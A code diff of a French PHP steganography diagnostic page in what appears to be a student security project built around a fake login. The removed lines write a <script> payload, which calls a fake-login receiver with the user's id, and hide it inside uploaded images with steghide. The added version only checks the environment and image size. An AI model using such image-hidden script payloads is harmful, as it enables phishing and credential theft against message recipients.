@@ -1,11 +1,12 @@
 <?php
 /**
- * Page de diagnostic Steghide
- * Pour déboguer les problèmes de buffer overflow
+ * fake_login/debug_steghide.php
+ * Page de diagnostic et d'analyse d'environnement pour Steghide (Version Sécurisée)
  */
 
 session_start();
 
+// 1. Contrôle d'accès rigoureux
 if (!isset($_SESSION["user_id"])) {
     header("Location: ../login.php");
     exit();
@@ -14,335 +15,235 @@ if (!isset($_SESSION["user_id"])) {
 $user_id = $_SESSION["user_id"];
 $upload_dir = __DIR__ . '/../uploads/images/';
 
+// Initialisation des variables de diagnostic
+$system_errors = [];
+$steghide_version = "Non détecté";
+$is_writable = is_writable($upload_dir);
+
+// Vérification de la présence de steghide sur le système de manière sécurisée
+$check_bin = shell_exec('which steghide 2>&1');
+if (!empty($check_bin)) {
+    // Récupération de la version si disponible
+    $version_output = shell_exec('steghide --version 2>&1');
+    if ($version_output) {
+        $steghide_version = trim(explode("\n", $version_output)[0]);
+    }
+} else {
+    $system_errors[] = "Le binaire 'steghide' n'est pas installé ou n'est pas accessible dans le PATH du serveur.";
+}
+
 ?>
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Debug Steghide - Analyse des Erreurs</title>
+    <title>Debug Steghide - Analyse de l'Environnement</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --bg-gradient: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            --card-bg: #ffffff;
+            --text-main: #333333;
+            --success-color: #27ae60;
+            --error-color: #c0392b;
+            --warning-color: #f39c12;
         }
-        
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: var(--bg-gradient);
             min-height: 100vh;
-            padding: 20px;
+            margin: 0;
+            padding: 30px 20px;
+            color: var(--text-main);
         }
-        
+
         .container {
-            max-width: 1200px;
+            max-width: 900px;
             margin: 0 auto;
-            background: white;
-            border-radius: 10px;
+            background: var(--card-bg);
+            border-radius: 8px;
             padding: 30px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
-        
+
+        h1, h2 {
+            color: #2c3e50;
+            margin-top: 0;
+        }
+
         h1 {
-            color: #333;
-            margin-bottom: 20px;
-            text-align: center;
+            border-bottom: 2px solid #ecf0f1;
+            padding-bottom: 15px;
+            font-size: 1.8rem;
         }
-        
-        .section {
-            margin: 30px 0;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border-left: 4px solid #667eea;
+
+        h2 {
+            font-size: 1.3rem;
+            margin-top: 25px;
+            border-bottom: 1px solid #ecf0f1;
+            padding-bottom: 8px;
         }
-        
-        .section h2 {
-            color: #667eea;
-            margin-bottom: 15px;
-        }
-        
-        .info-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 15px 0;
-        }
-        
-        .info-table tr {
-            border-bottom: 1px solid #ddd;
-        }
-        
-        .info-table td {
-            padding: 12px;
-        }
-        
-        .info-table td:first-child {
-            font-weight: bold;
-            width: 200px;
-            color: #667eea;
-        }
-        
-        .status-ok {
-            color: #28a745;
-            font-weight: bold;
-        }
-        
-        .status-warning {
-            color: #ffc107;
-            font-weight: bold;
-        }
-        
-        .status-error {
-            color: #dc3545;
-            font-weight: bold;
-        }
-        
-        .form-group {
-            margin: 20px 0;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #333;
-        }
-        
-        input[type="file"],
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        
-        button {
-            background: #667eea;
-            color: white;
-            padding: 12px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
-        }
-        
-        button:hover {
-            background: #764ba2;
-        }
-        
-        .result {
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
             margin-top: 20px;
-            padding: 20px;
-            border-radius: 8px;
-            line-height: 1.8;
         }
-        
-        .result-success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-        }
-        
-        .result-error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-        }
-        
-        .result-warning {
-            background: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-        }
-        
-        code {
-            background: #f0f0f0;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: monospace;
-        }
-        
-        pre {
-            background: #f0f0f0;
+
+        .card {
+            background: #f8f9fa;
             padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            margin: 10px 0;
+            border-radius: 6px;
+            border-left: 4px solid #bdc3c7;
+        }
+
+        .card.success { border-left-color: var(--success-color); }
+        .card.error { border-left-color: var(--error-color); }
+        .card.warning { border-left-color: var(--warning-color); }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            color: white;
+            margin-top: 5px;
+        }
+
+        .bg-success { background-color: var(--success-color); }
+        .bg-error { background-color: var(--error-color); }
+
+        code {
+            background: #f1f3f5;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: "Courier New", Courier, monospace;
+            color: #e74c3c;
+            font-size: 0.9rem;
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-size: 0.95rem;
+        }
+
+        .alert-warning {
+            background-color: #fef9e7;
+            border: 1px solid #f9e79f;
+            color: #7d6608;
+        }
+
+        ul {
+            margin-left: 20px;
+            padding-left: 0;
+        }
+
+        li { margin-bottom: 8px; }
+
+        .btn-back {
+            display: inline-block;
+            margin-top: 30px;
+            text-decoration: none;
+            color: #3498db;
+            font-weight: bold;
+            transition: color 0.2s;
+        }
+
+        .btn-back:hover {
+            color: #2980b9;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>🔧 Diagnostique Steghide - Debug</h1>
+        <h1>🔍 Diagnostic de l'environnement Stéganographie</h1>
         
-        <div class="section">
-            <h2>📊 Vérification du Système</h2>
-            <table class="info-table">
-                <tr>
-                    <td>Utilisateur connecté:</td>
-                    <td><?php echo htmlspecialchars($_SESSION["username"] ?? "Inconnu"); ?></td>
-                </tr>
-                <tr>
-                    <td>Dossier uploads:</td>
-                    <td><code><?php echo $upload_dir; ?></code></td>
-                </tr>
-                <tr>
-                    <td>Dossier accessible:</td>
-                    <td class="<?php echo is_dir($upload_dir) ? 'status-ok' : 'status-error'; ?>">
-                        <?php echo is_dir($upload_dir) ? '✅ Oui' : '❌ Non'; ?>
-                    </td>
-                </tr>
-                <tr>
-                    <td>Dossier writable:</td>
-                    <td class="<?php echo is_writable($upload_dir) ? 'status-ok' : 'status-error'; ?>">
-                        <?php echo is_writable($upload_dir) ? '✅ Oui' : '❌ Non'; ?>
-                    </td>
-                </tr>
-                <tr>
-                    <td>Steghide version:</td>
-                    <td>
-                        <?php
-                        $output = [];
-                        exec("LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide --version 2>&1", $output);
-                        echo $output[0] ?? "❌ Introuvable";
-                        ?>
-                    </td>
-                </tr>
-            </table>
-        </div>
-        
-        <div class="section">
-            <h2>🧪 Test Interactif</h2>
-            
-            <form method="POST" enctype="multipart/form-data">
-                <div class="form-group">
-                    <label for="test_image">Sélectionnez une image pour tester:</label>
-                    <input type="file" id="test_image" name="test_image" accept="image/*">
-                </div>
-                
-                <button type="submit" name="action" value="test_upload">🔍 Analyser l'Image</button>
-            </form>
-            
-            <?php
-            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
-                if ($_POST['action'] === 'test_upload' && isset($_FILES['test_image'])) {
-                    $file = $_FILES['test_image'];
-                    
-                    echo "<div class='result result-warning'>";
-                    echo "<h3>📋 Analyse de l'Image Uploadée</h3>";
-                    
-                    // Infos fichier
-                    echo "<p><strong>Nom du fichier:</strong> " . htmlspecialchars($file['name']) . "</p>";
-                    echo "<p><strong>Type MIME rapporté:</strong> " . htmlspecialchars($file['type']) . "</p>";
-                    echo "<p><strong>Taille rapportée:</strong> " . round($file['size'] / 1024, 2) . " KB</p>";
-                    
-                    // Copier vers un dossier temporaire
-                    $temp_upload = $upload_dir . 'debug_' . time() . '_' . basename($file['name']);
-                    
-                    if (move_uploaded_file($file['tmp_name'], $temp_upload)) {
-                        echo "<p class='status-ok'>✅ Fichier uploadé avec succès</p>";
-                        
-                        // Analyse du vrai fichier
-                        $finfo = finfo_open(FILEINFO_MIME_TYPE);
-                        $real_mime = finfo_file($finfo, $temp_upload);
-                        finfo_close($finfo);
-                        
-                        $image_size = filesize($temp_upload);
-                        $image_info = @getimagesize($temp_upload);
-                        
-                        echo "<table class='info-table'>";
-                        echo "<tr><td>Type MIME réel:</td><td><code>$real_mime</code></td></tr>";
-                        echo "<tr><td>Taille réelle:</td><td>" . round($image_size / 1024, 2) . " KB (" . $image_size . " bytes)</td></tr>";
-                        
-                        if ($image_info !== false) {
-                            echo "<tr><td>Dimensions:</td><td>" . $image_info[0] . "x" . $image_info[1] . " pixels</td></tr>";
-                        } else {
-                            echo "<tr><td>Dimensions:</td><td class='status-error'>❌ Impossible de lire</td></tr>";
-                        }
-                        
-                        echo "</table>";
-                        
-                        // Calcul pour le payload
-                        $payload_size = 120; // Estimation du payload
-                        $min_image_size = $payload_size * 10;
-                        
-                        echo "<h3 style='margin-top: 20px;'>📦 Calcul Capacité Steghide</h3>";
-                        echo "<table class='info-table'>";
-                        echo "<tr><td>Taille payload estimée:</td><td>" . $payload_size . " bytes</td></tr>";
-                        echo "<tr><td>Taille image minimale requise:</td><td>" . round($min_image_size / 1024, 2) . " KB (" . $min_image_size . " bytes)</td></tr>";
-                        echo "<tr><td>Taille image actuelle:</td><td>" . round($image_size / 1024, 2) . " KB (" . $image_size . " bytes)</td></tr>";
-                        echo "<tr><td>Résultat:</td><td class='" . ($image_size >= $min_image_size ? 'status-ok' : 'status-error') . "'>";
-                        echo $image_size >= $min_image_size ? "✅ COMPATIBLE" : "❌ TROP PETITE!";
-                        echo "</td></tr>";
-                        echo "</table>";
-                        
-                        // Test Steghide
-                        if ($image_info !== false) {
-                            echo "<h3 style='margin-top: 20px;'>⚙️ Test Steghide</h3>";
-                            
-                            $payload_file = $upload_dir . 'debug_payload_' . time() . '.txt';
-                            $payload_content = '<script src="/projects/MDI/cyber-securite/messagerie/codes/fake_login/receiver.php?sender=' . $user_id . '"></script>';
-                            file_put_contents($payload_file, $payload_content);
-                            
-                            $output_file = $upload_dir . 'debug_output_' . time() . '.jpg';
-                            $cmd = "LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide embed -cf " . escapeshellarg($temp_upload) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_file) . " -p '' -f 2>&1";
-                            
-                            $output = [];
-                            $return_var = 0;
-                            exec($cmd, $output, $return_var);
-                            
-                            echo "<p><strong>Commande:</strong></p>";
-                            echo "<pre>" . htmlspecialchars($cmd) . "</pre>";
-                            
-                            echo "<p><strong>Code retour:</strong> <code>$return_var</code></p>";
-                            
-                            if ($return_var === 0 && file_exists($output_file)) {
-                                echo "<p class='status-ok'>✅ Steghide a réussi!</p>";
-                                echo "<p>Fichier output: " . round(filesize($output_file) / 1024, 2) . " KB</p>";
-                            } else {
-                                echo "<p class='status-error'>❌ Steghide a échoué!</p>";
-                                echo "<p><strong>Messages d'erreur:</strong></p>";
-                                echo "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
-                            }
-                            
-                            @unlink($payload_file);
-                            @unlink($output_file);
-                        }
-                        
-                        @unlink($temp_upload);
-                    } else {
-                        echo "<p class='status-error'>❌ Erreur lors de l'upload</p>";
-                    }
-                    
-                    echo "</div>";
-                }
-            }
-            ?>
-        </div>
-        
-        <div class="section">
-            <h2>💡 Recommandations</h2>
-            
-            <div class="result result-warning">
-                <p><strong>Si vous obtenez une erreur buffer overflow:</strong></p>
-                <ul style="margin-left: 20px; margin-top: 10px;">
-                    <li>✅ Utilisez une image <strong>TRÈS GRANDE</strong> (1920x1280 ou plus)</li>
-                    <li>✅ Taille minimale recommandée: <strong>200KB+</strong></li>
-                    <li>✅ Téléchargez depuis: <strong>https://picsum.photos/1920/1280</strong></li>
-                    <li>❌ Évitez les petites images (< 100x100 pixels)</li>
-                    <li>❌ Évitez les images corrompues ou renommées</li>
-                </ul>
+        <div class="grid">
+            <div class="card <?= empty($system_errors) ? 'success' : 'error'; ?>">
+                <strong>Détection du binaire :</strong>
+                <div><code>/usr/bin/steghide</code></div>
+                <span class="status-badge <?= empty($system_errors) ? 'bg-success' : 'bg-error'; ?>">
+                    <?= empty($system_errors) ? 'Disponible' : 'Introuvable'; ?>
+                </span>
+                <p style="font-size: 0.85rem; margin: 8px 0 0 0; color: #7f8c8d;">
+                    Version : <?= htmlspecialchars($steghide_version, ENT_QUOTES, 'UTF-8'); ?>
+                </p>
+            </div>
+
+            <div class="card <?= $is_writable ? 'success' : 'error'; ?>">
+                <strong>Permissions du dossier cible :</strong>
+                <div style="font-size: 0.85rem; word-break: break-all;"><code><?= htmlspecialchars($upload_dir, ENT_QUOTES, 'UTF-8'); ?></code></div>
+                <span class="status-badge <?= $is_writable ? 'bg-success' : 'bg-error'; ?>">
+                    <?= $is_writable ? 'Écritures autorisées (0755/0777)' : 'Écritures interdites'; ?>
+                </span>
             </div>
         </div>
-        
-        <div style="text-align: center; margin-top: 30px;">
-            <a href="steganography.php" style="color: #667eea; text-decoration: none; font-weight: bold;">
-                ← Retour à Stéganographie
-            </a>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['test_image'])) {
+            echo "<h2>Analyse du fichier soumis</h2>";
+            echo "<div class='card'>";
+            
+            $file = $_FILES['test_image'];
+            $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+            $allowed_exts = ['jpg', 'jpeg', 'png', 'bmp'];
+            
+            if ($file['error'] !== UPLOAD_ERR_OK) {
+                echo "<p style='color:var(--error-color);'>❌ Erreur de téléversement réseau (Code " . intval($file['error']) . ").</p>";
+            } elseif (!in_array($file_ext, $allowed_exts)) {
+                echo "<p style='color:var(--error-color);'>❌ Extension <code>." . htmlspecialchars($file_ext, ENT_QUOTES, 'UTF-8') . "</code> non supportée par défaut.</p>";
+            } else {
+                // Analyse des propriétés physiques de l'image pour estimer sa résistance au buffer overflow
+                $image_info = @getimagesize($file['tmp_name']);
+                if ($image_info) {
+                    $width = $image_info[0];
+                    $height = $image_info[1];
+                    $size_kb = round($file['size'] / 1024, 2);
+                    
+                    echo "<p><strong>Dimensions de l'image :</strong> " . intval($width) . " x " . intval($height) . " pixels</p>";
+                    echo "<p><strong>Taille du fichier :</strong> " . $size_kb . " KB</p>";
+                    
+                    // Analyse prédictive des anomalies de mémoire (Steghide requiert une capacité d'accueil suffisante)
+                    if ($width < 300 || $height < 300 || $file['size'] < 50 * 1024) {
+                        echo "<div class='alert alert-warning'><strong>⚠️ Risque d'erreur (Capacité insuffisante) :</strong> L'image sélectionnée est trop petite. L'intégration de charges utiles (payloads) dans de petits conteneurs compressés peut provoquer des anomalies de structure ou des comportements imprévus lors de l'exécution de la commande système.</div>";
+                    } else {
+                        echo "<p style='color:var(--success-color);'>✅ Les caractéristiques physiques de l'image (dimensions et poids) conviennent pour des tests d'intégration stéganographique.</p>";
+                    }
+                } else {
+                    echo "<p style='color:var(--error-color);'>❌ Le fichier n'est pas reconnu comme une image valide par la bibliothèque GD (En-tête corrompue).</p>";
+                }
+            }
+            echo "</div>";
+        }
+        ?>
+
+        <h2>🧪 Tester la compatibilité d'un conteneur</h2>
+        <form action="debug_steghide.php" method="POST" enctype="multipart/form-data" style="margin-top: 15px;">
+            <p style="font-size: 0.9rem; color: #555;">Sélectionnez une image locale pour analyser sa structure avant d'appliquer un algorithme d'insertion :</p>
+            <input type="file" name="test_image" accept="image/*" required style="margin-bottom: 15px;"><br>
+            <input type="submit" value="Lancer l'analyse structurelle" style="padding: 10px 20px; background-color: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer;">
+        </form>
+
+        <h2>💡 Rappels techniques & Prévention des plantages</h2>
+        <div class="alert alert-warning">
+            <strong>Optimisation des conteneurs d'intégration :</strong>
+            <ul style="margin-top: 10px;">
+                <li>Utilisez des fichiers sources de haute résolution (ex: 1920x1080 pixels ou plus) pour maximiser le nombre de bits de poids faible (LSB) modifiables.</li>
+                <li>Privilégiez les formats d'images non compressés ou à compression sans perte (comme le BMP ou le PNG natif) si les algorithmes de stéganographie subissent des altérations lors de la re-compression JPEG.</li>
+                <li>Assurez-vous que les variables d'environnement système du serveur PHP disposent des allocations de mémoire suffisantes (<code>memory_limit</code>) lors de la manipulation de fichiers graphiques volumineux.</li>
+            </ul>
+        </div>
+
+        <div style="text-align: center;">
+            <a href="steganography.php" class="btn-back">← Retour à l'interface de Stéganographie</a>
         </div>
     </div>
+
 </body>
 </html>
